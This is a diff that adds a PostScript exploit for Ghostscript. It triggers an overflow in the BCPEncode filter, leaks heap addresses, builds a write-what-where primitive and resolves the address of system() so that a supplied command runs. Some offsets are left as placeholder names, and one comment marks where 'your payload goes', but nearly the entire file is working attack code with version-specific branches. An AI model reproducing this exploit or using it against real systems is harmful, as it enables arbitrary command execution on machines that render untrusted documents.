@@ -1,0 +1,143 @@
+10000000 setvmthreshold
+% (a) (b) -> (ab) 
+/concatstrings { exch dup length 
+ 2 index length add string 
+ dup dup 4 2 roll copy length
+ 4 -1 roll putinterval
+} bind def
+
+% (aabb) -> (bbaa)
+/reverse{
+ /str exch def
+ /temp str 0 get def
+ /i 0 def
+ str length 2 idiv{
+  /temp str i get def
+  str i str str length i sub 1 sub get put
+  str str length i sub 1 sub temp put
+  /i i 1 add def
+ }repeat
+ str 
+}def
+%offset addr -> addr+offset
+/addOffset{
+ exch (16#) exch concatstrings
+ cvi
+ add
+ 16 16 string cvrs
+}def
+% addr offset -> addr-offset
+/subOffset{
+ exch (16#) exch concatstrings
+ cvi
+ exch
+ sub
+ 16 16 string cvrs
+}def
+% - -> a long string
+/createOverflow {
+ ()
+ 1 1 2045 {pop <41> concatstrings}for
+ <1313> concatstrings %escaped char
+ revision 9560 ge 
+ {1 1 15 {pop <42> concatstrings} for}
+ {1 1 23 {pop <42> concatstrings} for}
+ ifelse
+}def
+
+/leakAsString{
+ /myString 16 string def
+ /asciiToHexFilter myString /ASCIIHexEncode filter def
+ asciiToHexFilter exch writestring
+ asciiToHexFilter flushfile
+ myString
+}def
+
+
+% (0xstring) --> ascii string
+/stringToAddress{
+ % from 0x231 to 0x0231, otherwise the filter understand 0x23 then 0x10
+ dup length 2 mod 1 eq {(0) exch concatstrings}if
+ /ASCIIHexDecode filter
+ 8 string readstring
+ pop
+ reverse
+ % from 0xdeadbeef to 0x00000000deadbeef
+ {dup length 8 eq {exit} {<00> concatstrings }ifelse}loop 
+}def
+% - -> a 8 bytes leak from the heap (i/o pool)
+/leakMemory{
+ /leakBuffer 10000 string def
+ /leakMemoryFilter leakBuffer /NullEncode filter /BCPEncode filter def
+ createOverflow
+ <6964004343434343> concatstrings % s->templat (your payload goes here)
+ <4444444444444444> concatstrings % s->memory
+ <4545454545454545> concatstrings % s->report_error
+ <4646464646464646> concatstrings % s->min_left
+ 1 1 80{pop <47> concatstrings }  for% s->error_string
+ <4848484848484848> concatstrings % s->cursor->r->ptr
+ leakMemoryFilter exch writestring
+ leakMemoryFilter flushfile
+ revision 9560 ge 
+ {/leak leakBuffer 2176 8 getinterval def}
+ {/leak leakBuffer 2184 8 getinterval def}
+ ifelse
+ leak
+ reverse
+} def
+
+
+% what where -> -
+/writewhatwhere {
+ createOverflow
+ <4343434343434343> concatstrings % s->templat
+ <4444444444444444> concatstrings % s->memory
+ <4545454545454545> concatstrings % s->report_error
+ <4646464646464646> concatstrings % s->min_left
+ 1 1 80 {pop <47> concatstrings }  for% s->error_string
+ <4848484848484848> concatstrings % s->cursor->r->ptr 
+ exch concatstrings  % (where) s->cursor->r->limit -  also update s->cursor->w->ptr
+ <4444444444444444> concatstrings % s->cursor->w->limit
+ <4545454545454545> concatstrings % s->cbuf.  
+ /openWriteFilter 5000 string /NullEncode filter /BCPEncode filter def
+ openWriteFilter exch writestring
+ openWriteFilter flushfile
+ openWriteFilter exch writestring
+}def
+
+/readProc{
+    leakMemory
+    leakAsString
+    dup (Found leak: 0x) exch concatstrings (\n) concatstrings print
+    revision 9560 ge 
+    {dup 375 subOffset} %start of bcpe stream}
+    {dup 383 subOffset} 
+    ifelse
+    dup (BCPE stream: 0x) exch concatstrings (\n) concatstrings print
+    dup 111 addOffset %start of read cursor-1
+    dup (Start of read cursor -1 : 0x) exch concatstrings (\n) concatstrings print
+    dup 81 addOffset %start of proc
+    dup (Proc 0x) exch concatstrings (\n) concatstrings print
+    dup 64 addOffset
+    stringToAddress exch stringToAddress exch concatstrings
+    exch stringToAddress
+    writewhatwhere
+    leakMemoryFilter () writestring leakMemoryFilter flushfile
+    leakBuffer
+    revision 9560 ge
+    {2191 8 getinterval reverse leakAsString}
+    {2199 8 getinterval reverse leakAsString}
+    ifelse    
+    dup (Found leak proc: 0x) exch concatstrings (\n) concatstrings print
+}def 
+
+readProc
+F_ADDR_S_STD_NOSEEK_OFFSET subOffset
+dup (Base r-x: 0x) exch concatstrings (\n) concatstrings print
+LIBC_PLT_OFFSET addOffset
+dup (system@plt: 0x) exch concatstrings (\n) concatstrings print
+exch 231 addOffset
+dup (process : 0x) exch concatstrings (\n) concatstrings print
+stringToAddress exch stringToAddress exch
+writewhatwhere
+leakMemoryFilter (aa) writestring leakMemoryFilter flushfile
